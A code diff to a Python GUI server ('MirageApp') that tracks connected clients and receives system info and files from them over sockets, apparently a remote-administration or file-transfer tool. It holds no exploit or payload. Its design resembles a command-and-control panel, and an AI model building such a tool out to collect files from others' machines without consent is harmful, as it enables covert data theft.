@@ -86,15 +86,9 @@ class Server(ctk.CTk):
                     
                     if not command:
                         break  
-                    
-                    
 
-                    """
-                    if 'download' in command:
-                        threading.Thread(target=self.download_file, args=('', ip, port), daemon=True).start()
-                    """
                     if command.startswith("FILE"):
-                        pass
+                        threading.Thread(target=self.download_file, args=('', ip, port), daemon=True).start()
                     
                     elif command == "info":
                         info = conn.recv(5000).decode()
@@ -182,8 +176,6 @@ class Server(ctk.CTk):
         for client in self.clients:
             if client["ip"] == ip and client["port"] == port:
                 try:
-                    #client["conn"].send(b"SEND_FILE")
-
                     header = client["conn"].recv(1024).decode('utf-8').strip()
                     if header.startswith("FILE"):
                         parts = header.split()
@@ -191,6 +183,9 @@ class Server(ctk.CTk):
                         filename = parts[2]
 
                         save_filename = os.path.join(save_path, filename)
+
+                        client["conn"].send(b"SEND_FILE")
+
                         with open(save_filename, 'wb') as file:
                             received = 0
                             while received < file_size:
@@ -232,7 +227,7 @@ class MirageApp(ctk.CTk):
         self.user_frames = []
 
 
-        create_key()
+        create_key() #create secret key for acces to server
         self.load = load_settings()
         self.HOST, self.PORT = self.load['host'], self.load['port']
         self.host_remote, self.port_remote =self.load['host_remote'], self.load['port_remote']
